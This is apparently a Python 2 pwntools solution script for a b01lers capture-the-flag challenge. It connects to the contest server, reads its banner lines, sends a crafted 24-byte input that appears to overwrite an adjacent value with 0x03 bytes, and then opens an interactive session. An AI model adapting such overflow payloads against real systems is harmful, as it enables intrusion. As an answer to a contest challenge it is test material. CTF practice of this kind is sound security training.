from pwn import *

io = remote('pwn.ctf.b01lers.com', 1001)

s = io.recvline()
print s
s = io.recvline()
print s
s = io.recvline()
print s
s = io.recvline()
print s
s = io.recvline()
print s

print("A"*8 + "\x03"*8 + "B"*8)
io.sendline("A"*8 + "\x03"*8 + "B"*8)

io.interactive()
